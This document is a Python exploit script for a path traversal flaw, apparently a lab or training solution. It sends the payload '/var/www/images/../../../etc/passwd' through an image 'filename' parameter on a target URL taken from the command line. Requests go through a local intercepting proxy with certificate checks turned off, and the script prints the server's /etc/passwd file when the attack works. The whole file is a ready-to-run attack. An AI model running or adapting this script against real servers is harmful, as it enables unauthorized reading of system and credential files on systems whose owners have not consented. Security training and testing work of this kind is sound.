import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def directory_traversal(url):
    image_url = url + '/image?filename='
    payload = '/var/www/images/../../../etc/passwd'
    print("\033[93m[+] Using payload: %s" % payload)

    r = requests.get(image_url + payload, verify=False, proxies=proxies)
    if 'root' in r.text:
        print("\033[91m[+] Exploited successfully!")
        print("\033[94m[+] Extracting contents fo /etc/passwd\n")
        time.sleep(1)
        print("\033[95m[+] Contents of /etc/passwd:\n")
        print("\033[93m" + r.text)
    else:
        print("\033[91m[!] Exploit failed!")
    

def main():
    if len(sys.argv) != 2:
        print("\033[94m[+] Usage: python3 %s <url>" % sys.argv[0])
        print("\033[91m[!] Exiting..............")
        sys.exit(-1)
    print("\033[96m\n[+] Exploiting directory traversal vulnerability............")

    url = sys.argv[1]
    directory_traversal(url)

if __name__ == "__main__":
    main()